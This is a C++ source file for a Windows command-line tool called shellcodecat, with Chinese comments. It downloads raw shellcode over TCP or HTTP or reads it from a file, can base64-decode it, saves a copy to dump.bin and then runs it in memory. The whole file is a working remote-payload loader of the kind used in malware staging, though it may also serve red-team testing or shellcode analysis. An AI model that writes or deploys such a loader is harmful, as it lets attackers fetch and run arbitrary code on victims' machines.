// shellcodecat.cpp: 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <vector>
#include <string>
#include "ShellcodeExe.h"
#include "http.h"
#include "tcp.h"
#include "base64.h"

void usage();
void SplitString(const std::string& s, std::vector<std::string>& v, const std::string& c);

int main(int argc,char** argv)
{

	size_t dataSize = 0;
	char* pData = NULL;
	bool base64 = false;
	enum source
	{
		NONE, TCP, _FILE, HTTP
	};
	source src = NONE;
	std::string locator;
	for (int i = 1; i < argc; i++)
	{
		if (strcmp(argv[i], "--tcp") == 0)
		{
			src = TCP;
			locator.append(argv[i + 1]);
		}
		else if (strcmp(argv[i], "--file") == 0)
		{
			src = _FILE;
			locator.append(argv[i + 1]);
		}
		else if (strcmp(argv[i], "--http") == 0)
		{
			src = HTTP;
			locator.append(argv[i + 1]);
		}
		else if (strcmp(argv[i], "-b") == 0)
		{
			base64 = true;
		}
	}
	if (src == TCP)
	{
		//locator
		std::vector<std::string> v;
		SplitString(locator, v, ":");
		pData = SocketReceive(v[0].c_str(), std::stoi(v[1].c_str()), dataSize);
	}
	else if (src == _FILE)
	{
		FILE* fp;
		fopen_s(&fp, locator.c_str(), "rb");
		fseek(fp, 0, SEEK_END); //定位到文件末 
		dataSize = ftell(fp); //文件长度
		fseek(fp, 0, SEEK_SET); //定位到文件头
		pData = new char[dataSize];
		fread(pData, dataSize, 1, fp);
		fclose(fp);
	}
	else if (src == HTTP)
	{
		pData = HttpReceive(locator.c_str(), dataSize);
	}
	else
	{
		usage();
		return 0;
	}
	if (base64)
	{
		pData = (char*)ReadBase64(pData, dataSize);
	}
	FILE* f;
	fopen_s(&f,"dump.bin", "wb");
	fwrite(pData, dataSize, 1, f);
	fclose(f);


	ShellcodeExe(pData, dataSize);
    return 0;
}

void SplitString(const std::string& s, std::vector<std::string>& v, const std::string& c)
{
	std::string::size_type pos1, pos2;
	pos2 = s.find(c);
	pos1 = 0;
	while (std::string::npos != pos2)
	{
		v.push_back(s.substr(pos1, pos2 - pos1));

		pos1 = pos2 + c.size();
		pos2 = s.find(c, pos1);
	}
	if (pos1 != s.length())
		v.push_back(s.substr(pos1));
}
void usage()
{
	printf("usage: shellcodecat.exe [-h] --[tcp|file|http] location\n\
 arguments :\n\
 -h, --help			show this help message and exit\n\
 --tcp <ip:port>	get file by tcp\n\
 --file <path>		file by py path\n\
 --http <url>		file by http\n\
 -b					using base64 decode the data\n\
	");
}
